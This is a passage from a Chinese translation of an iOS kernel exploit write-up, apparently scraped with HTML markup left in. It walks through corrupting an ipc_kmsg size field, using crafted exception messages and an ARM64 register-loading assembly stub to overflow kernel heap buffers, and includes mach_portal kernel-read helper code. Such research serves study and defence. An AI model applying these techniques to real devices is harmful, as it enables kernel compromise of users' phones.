+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^~~~~~~~~~~~
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recipe_size</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Clang认为开发人员多输入了一个“s”。Clang并没有意识到，它的假设在语义上是完全错误的，并且会引发严重的内存破坏问题。我认为开发人员采取了cl ang的建议，删除了&#39;s&#39;，然后重新进行了构建，并且没有再出现编错误。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构建原语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如果size参数大于0x4000000，则iOS上的copyin将失败。由于recipes_size也需要一个有效的用户空间指针，这意味着我们必须能够映射一个低的地址。对于64位iOS应用程序来说，我们可以通过给pagezero_size链接器选项赋予一个比较小的值来达到这个目的。通过确保我们的数据与内存页末尾右对齐，后跟一个未映射的内存页来完全控制副本的大小。当副本到达未映射的内存页并停止时，copyin将发生故障。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01b9e22fe253f96629.png" title="t01578b28620394afd1.png" alt="http://p5.qhimg.com/t01578b28620394afd1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果copyin失败，缓冲区将立即释放。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">综合起来，我们就可以分配一个大小介于256到5120字节之间的kalloc堆，然后使用完全受控数据任意溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当我利用一个新的漏洞时，我会花费很多时间寻找新的原语；例如分配在堆上的对象，如果我可以溢出它，就可能会导致一连串有趣的事情发生。一般有趣的意思是，如果我得手了，我可以用它来建立一个更好的原语。通常我的最终目标是链接这些原语以获得任意的、可重复和可靠的内存读/写。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为此，我一直在寻找一种对象，它包含一个可以被破坏的长度或大小字段，同时不必完全损坏任何指针。这通常是一个有趣的目标，值得进一步探究。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于曾经写过浏览器漏洞的人来说，这将是一个熟悉的结构！&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>ipc_kmsg</strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了寻找相应的原语，我通读了XNU的代码，并无意中发现了ipc_kmsg：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">struct&nbsp;ipc_kmsg&nbsp;{
+&nbsp;&nbsp;mach_msg_size_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_size;
+&nbsp;&nbsp;struct&nbsp;ipc_kmsg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*ikm_next;
+&nbsp;&nbsp;struct&nbsp;ipc_kmsg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*ikm_prev;
+&nbsp;&nbsp;mach_msg_header_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*ikm_header;
+&nbsp;&nbsp;ipc_port_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_prealloc;
+&nbsp;&nbsp;ipc_port_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_voucher;
+&nbsp;&nbsp;mach_msg_priority_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_qos;
+&nbsp;&nbsp;mach_msg_priority_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_qos_override
+&nbsp;&nbsp;struct&nbsp;ipc_importance_elem&nbsp;*ikm_importance;
+&nbsp;&nbsp;queue_chain_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ikm_inheritance;
+};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个具有可能被破坏的大小字段的结构，并且不需要知道任何指针值。那么，我们该如何使用ikm_size字段？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在代码中寻找对ikm_size的交叉引用，我们可以看到它仅在少数几个地方被用到：&nbsp;</span></p><pre class="brush:plain;toolbar:false">void&nbsp;ipc_kmsg_free(ipc_kmsg_t&nbsp;kmsg);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个函数使用kmsg-&gt; ikm_size将kmsg释放给正确的kalloc内存区。内存区分配器将检测到错误的区域，所以必须小心，在修复大小之前不要释放损坏的ipc_kmsg。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该宏用于设置ikm_size字段：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#define&nbsp;ikm_init(kmsg,&nbsp;size)&nbsp;&nbsp;\
+MACRO_BEGIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;(kmsg)-&gt;ikm_size&nbsp;=&nbsp;(size);&nbsp;&nbsp;&nbsp;\
+该宏使用ikm_size字段来设置ikm_header指针：&nbsp;
+#define&nbsp;ikm_set_header(kmsg,&nbsp;mtsize)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;
+MACRO_BEGIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;(kmsg)-&gt;ikm_header&nbsp;=&nbsp;(mach_msg_header_t&nbsp;*)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;((vm_offset_t)((kmsg)&nbsp;+&nbsp;1)&nbsp;+&nbsp;(kmsg)-&gt;ikm_size&nbsp;-&nbsp;(mtsize));&nbsp;\
+MACRO_END</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该宏使用ikm_size字段来设置ikm_header字段，使消息与缓冲区的末尾对齐。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后还要检查ipc_kmsg_get_from_kernel：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;if&nbsp;(msg_and_trailer_size&nbsp;&gt;&nbsp;kmsg-&gt;ikm_size&nbsp;-&nbsp;max_desc)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;ip_unlock(dest_port);
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;MACH_SEND_TOO_LARGE;
+&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是使用ikm_size字段来确保消息的ikm_kmsg缓冲区中有足够的空间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看来，如果我们破坏了ikm_size字段，就能让内核相信消息缓冲区的大小大于其实际尺寸，这几乎肯定会导致消息内容被写出界。不过，这里只是从一个内核堆溢出到...另一个内核堆溢出吗？ 这次的差异在于，一个损坏的ipc_kmsg还可能让我越界读取内存。所以，破坏ikm_size字段可能是一件有趣的事情。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关于消息的发送</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ikm_kmsg结构用于保存传输中的信息。当用户空间发送mach消息时，最终会用到ipc_kmsg_alloc。如果消息很小（小于IKM_SAVED_MSG_SIZE），则代码将首先查看cpu本地缓存，以寻找最近释放的ikm_kmsg结构。如果没有找到的话，就从专用的ipc.kmsg zalloc区域分配一个新的可缓存消息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">更大的消息则由kalloc（通用内核堆分配器）直接分配。在分配缓冲区之后，使用我们见过的两个宏立即初始化该结构：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;kmsg&nbsp;=&nbsp;(ipc_kmsg_t)kalloc(ikm_plus_overhead(max_expanded_size));
+...&nbsp;&nbsp;
+&nbsp;&nbsp;if&nbsp;(kmsg&nbsp;!=&nbsp;IKM_NULL)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;ikm_init(kmsg,&nbsp;max_expanded_size);
+&nbsp;&nbsp;&nbsp;&nbsp;ikm_set_header(kmsg,&nbsp;msg_and_trailer_size);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;return(kmsg);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">除非我们能够破坏这两个宏之间的ikm_size字段，否则我们最有可能做到的是使消息被释放到错误的区域并立即引起panic。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是ikm_set_header还在另一个地方被调用：ipc_kmsg_get_from_kernel。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该函数仅在内核发送真正的mach消息时使用；例如，它不用于发送内核MIG API的响应。这个函数的注释非常有帮助：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;*&nbsp;Routine:&nbsp;ipc_kmsg_get_from_kernel
+&nbsp;*&nbsp;Purpose:
+&nbsp;*&nbsp;&nbsp;First&nbsp;checks&nbsp;for&nbsp;a&nbsp;preallocated&nbsp;message
+&nbsp;*&nbsp;&nbsp;reserved&nbsp;for&nbsp;kernel&nbsp;clients.&nbsp;&nbsp;If&nbsp;not&nbsp;found&nbsp;-
+&nbsp;*&nbsp;&nbsp;allocates&nbsp;a&nbsp;new&nbsp;kernel&nbsp;message&nbsp;buffer.
+&nbsp;*&nbsp;&nbsp;Copies&nbsp;a&nbsp;kernel&nbsp;message&nbsp;to&nbsp;the&nbsp;message&nbsp;buffer.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过用户空间中的mach_port_allocate_full方法，我们可以分配一个新的mach端口，它具有一个大小可控的单个预分配的ikm_kmsg缓冲区。预期的用例是允许用户空间接收关键消息，而内核不必进行堆分配。每当内核发送真正的mach消息时，它首先检查端口是否为这些预先分配的缓冲区之一，并且当前尚未使用。然后，进入下列代码（为了简洁起见，已经删除了无关代码）：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;if&nbsp;(IP_VALID(dest_port)&nbsp;&amp;&amp;&nbsp;IP_PREALLOC(dest_port))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;mach_msg_size_t&nbsp;max_desc&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;kmsg&nbsp;=&nbsp;dest_port-&gt;ip_premsg;
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(ikm_prealloc_inuse(kmsg))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_unlock(dest_port);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;MACH_SEND_NO_BUFFER;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(msg_and_trailer_size&nbsp;&gt;&nbsp;kmsg-&gt;ikm_size&nbsp;-&nbsp;max_desc)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip_unlock(dest_port);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;MACH_SEND_TOO_LARGE;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;ikm_prealloc_set_inuse(kmsg,&nbsp;dest_port);
+&nbsp;&nbsp;&nbsp;&nbsp;ikm_set_header(kmsg,&nbsp;msg_and_trailer_size);
+&nbsp;&nbsp;&nbsp;&nbsp;ip_unlock(dest_port);
+...&nbsp;&nbsp;
+&nbsp;&nbsp;(void)&nbsp;memcpy((void&nbsp;*)&nbsp;kmsg-&gt;ikm_header,&nbsp;(const&nbsp;void&nbsp;*)&nbsp;msg,&nbsp;size);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这段代码检查消息是否适合（信任kmsg-&gt; ikm_size），将预分配的缓冲区标记为正在使用，调用ikm_set_header宏，设置ikm_header，使消息与缓冲区的结尾对齐，最后调用memcpy将消息复制到ipc_kmsg中。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t016f4ed5c45e38f16b.png" title="t0126625098235a0159.png" alt="http://p5.qhimg.com/t0126625098235a0159.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这意味着如果我们可以破坏预先分配的ipc_kmsg的ikm_size字段，并使其看起来比实际情况大的话，则会将消息内容写入预分配的消息缓冲区的末尾。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ikm_header还用于mach消息接收路径，所以当我们得消息出队时，它也将读出边界。如果我们可以使用要读取的数据替换消息缓冲区之后的内容，我们就可以将其作为消息内容的一部分读取。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们正在构建的这个新原语在另一个方面更强大：如果我们得手了，我们将能够以可重复的、受控的方式进行越界读写，而不必每次触发漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">异常行为</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在使用预分配的消息的时候，存在一个难点：因为只有当内核向我们发送消息时才使用它们，所以我们不能只发送带有受控数据的消息，并使其使用预先分配的ipc_kmsg。相反，我们需要设法让内核向我们发送一个带有我们控制的数据的消息，这是非常困难的！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核中只有少数几处实际向用户空间发送mach消息。不过，但是存在各种类型的通知消息，如IODataQueue数据可用通知、IOServiceUserNotifications和无发送者通知。这些通知一般只包含少量用户控制的数据。由内核发送的、并且包含大量用户控制数据的唯一消息类型是异常消息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当线程发生故障（例如访问未分配的内存或调用软件断点指令）时，内核将向线程注册的异常处理程序端口发送异常消息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果线程没有异常处理程序端口，内核将尝试将消息发送到任务的异常处理程序端口，如果还失败了，异常消息将被传递到全局主机异常端口。线程可以正常设置自己的异常端口，但设置主机异常端口是特权操作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">routine&nbsp;thread_set_exception_ports(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;thread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;thread_act_t;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exception_mask&nbsp;:&nbsp;exception_mask_t;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;mach_port_t;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;behavior&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;exception_behavior_t;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_flavor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;thread_state_flavor_t);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这是thread_set_exception_ports的MIG定义。new_port应该是新的异常端口的发送权限。我们可以使用exception_mask来限制我们要处理的异常类型。behaviour定义了我们想要接收什么类型的异常消息，而new_flavor可以指定要包含在消息中的进程状态。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过给EXC_MASK_ALL、用于behavior的EXCEPTION_STATE和用于new_flavor的ARM_THREAD_STATE64传递exception_mask，则内核就会发送一个exception_raise_state消息到我们指定的线程发生故障时使用的异常端口。该消息将包含所有ARM64通用寄存器的状态，这就是我们所用的受控数据，它们将被写到ipc_kmsg缓冲区结尾之外！&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">相关的汇编代码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在我们的iOS XCode项目中，我们可以添加一个新的汇编文件，并定义一个函数load_regs_and_crash：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">.text
+.globl&nbsp;&nbsp;_load_regs_and_crash
+.align&nbsp;&nbsp;2
+_load_regs_and_crash:
+mov&nbsp;x30,&nbsp;x0
+ldp&nbsp;x0,&nbsp;x1,&nbsp;[x30,&nbsp;0]
+ldp&nbsp;x2,&nbsp;x3,&nbsp;[x30,&nbsp;0x10]
+ldp&nbsp;x4,&nbsp;x5,&nbsp;[x30,&nbsp;0x20]
+ldp&nbsp;x6,&nbsp;x7,&nbsp;[x30,&nbsp;0x30]
+ldp&nbsp;x8,&nbsp;x9,&nbsp;[x30,&nbsp;0x40]
+ldp&nbsp;x10,&nbsp;x11,&nbsp;[x30,&nbsp;0x50]
+ldp&nbsp;x12,&nbsp;x13,&nbsp;[x30,&nbsp;0x60]
+ldp&nbsp;x14,&nbsp;x15,&nbsp;[x30,&nbsp;0x70]
+ldp&nbsp;x16,&nbsp;x17,&nbsp;[x30,&nbsp;0x80]
+ldp&nbsp;x18,&nbsp;x19,&nbsp;[x30,&nbsp;0x90]
+ldp&nbsp;x20,&nbsp;x21,&nbsp;[x30,&nbsp;0xa0]
+ldp&nbsp;x22,&nbsp;x23,&nbsp;[x30,&nbsp;0xb0]
+ldp&nbsp;x24,&nbsp;x25,&nbsp;[x30,&nbsp;0xc0]
+ldp&nbsp;x26,&nbsp;x27,&nbsp;[x30,&nbsp;0xd0]
+ldp&nbsp;x28,&nbsp;x29,&nbsp;[x30,&nbsp;0xe0]
+brk&nbsp;0
+.align&nbsp;&nbsp;3</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该函数接收一个指向240字节缓冲区的指针作为第一个参数，然后将该缓冲区的值放到前30个ARM64通用寄存器中，以便当通过brk 0触发软件中断时，内核发送的异常消息能够以相同的顺序存放来自输入缓冲区的字节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们现在已经有了一种获取将被发送到预分配端口的消息中的受控数据的方法，但是我们应该用什么值覆盖ikm_size，才能使消息的受控部分与后面堆对象的开始重叠呢？ 通过静态方式可能做到这一点，但是如果使用内核调试器考察发送的情况的话，事情会更简单。然而，iOS只能运行在特定的硬件上，并且它们也没有提供内核调试方面的支持。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">打造自己的内核调试器（使用printfs和hexdumps）</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通常调试器有两个主要功能：断点和内存读写。实现断点非常麻烦，但是我们仍然可以使用内核内存访问来打造一个内核调试环境。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里需要处理引导问题；我们需要一个内核漏洞利用，让我们进行内核内存访问，以便开发我们的内核漏洞利用代码来提供内核内存访问功能！在12月份，我发布了mach_portal iOS内核漏洞利用代码，提供了内核内存读/写能力，其中的一些内核内省函数还允许您按名称查找进程任务结构和查找mach端口对象。我们可以转储Mach端口的kobject指针。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个新漏洞的第一个版本是在mach_portal xcode项目中开发的，所以我可以重用所有的代码。一切就绪后，我会将其从iOS 10.1.1移植到iOS 10.2。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在mach_portal里面，我可以找到一个预先分配的端口缓冲区的地址，如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;//&nbsp;allocate&nbsp;an&nbsp;ipc_kmsg:
+&nbsp;kern_return_t&nbsp;err;
+&nbsp;mach_port_qos_t&nbsp;qos&nbsp;=&nbsp;{0};
+&nbsp;qos.prealloc&nbsp;=&nbsp;1;
+&nbsp;qos.len&nbsp;=&nbsp;size;
+&nbsp;mach_port_name_t&nbsp;name&nbsp;=&nbsp;MACH_PORT_NULL;
+&nbsp;err&nbsp;=&nbsp;mach_port_allocate_full(mach_task_self(),
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MACH_PORT_RIGHT_RECEIVE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MACH_PORT_NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;qos,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;name);
+&nbsp;uint64_t&nbsp;port&nbsp;=&nbsp;get_port(name);
+&nbsp;uint64_t&nbsp;prealloc_buf&nbsp;=&nbsp;rk64(port+0x88);
+&nbsp;printf(&quot;0x%016llx,\n&quot;,&nbsp;prealloc_buf);
+get_port是mach_portal漏洞利用代码的一部分，其定义如下：&nbsp;
+uint64_t&nbsp;get_port(mach_port_name_t&nbsp;port_name){
+&nbsp;&nbsp;return&nbsp;proc_port_name_to_port_ptr(our_proc,&nbsp;port_name);
+}
+uint64_t&nbsp;proc_port_name_to_port_ptr(uint64_t&nbsp;proc,&nbsp;mach_port_name_t&nbsp;port_name)&nbsp;{
+&nbsp;&nbsp;uint64_t&nbsp;ports&nbsp;=&nbsp;get_proc_ipc_table(proc);
+&nbsp;&nbsp;uint32_t&nbsp;port_index&nbsp;=&nbsp;port_name&nbsp;&gt;&gt;&nbsp;8;
+&nbsp;&nbsp;uint64_t&nbsp;port&nbsp;=&nbsp;rk64(ports&nbsp;+&nbsp;(0x18*port_index));&nbsp;//ie_object
+&nbsp;&nbsp;return&nbsp;port;
+}
+uint64_t&nbsp;get_proc_ipc_table(uint64_t&nbsp;proc)&nbsp;{
+&nbsp;&nbsp;uint64_t&nbsp;task_t&nbsp;=&nbsp;rk64(proc&nbsp;+&nbsp;struct_proc_task_offset);
